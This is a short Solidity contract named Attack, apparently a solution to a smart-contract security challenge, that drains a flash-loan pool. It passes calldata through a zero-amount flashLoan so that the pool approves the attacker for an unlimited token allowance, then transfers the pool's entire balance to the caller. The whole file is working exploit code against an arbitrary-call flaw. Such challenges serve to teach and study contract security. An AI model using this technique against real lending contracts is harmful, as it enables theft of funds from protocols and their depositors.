// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DoTrustLender} from "./DoTrustLender.sol";

contract Attack {

    function attack(address pool, address _token) public {
        DoTrustLender lender = DoTrustLender(pool);
        IERC20 token = IERC20(_token);

        bytes memory attackData = abi.encodeCall(IERC20.approve, (address(this), type(uint256).max));

        lender.flashLoan(0, msg.sender, _token, attackData);

        token.transferFrom(pool, msg.sender, token.balanceOf(pool));
    }
}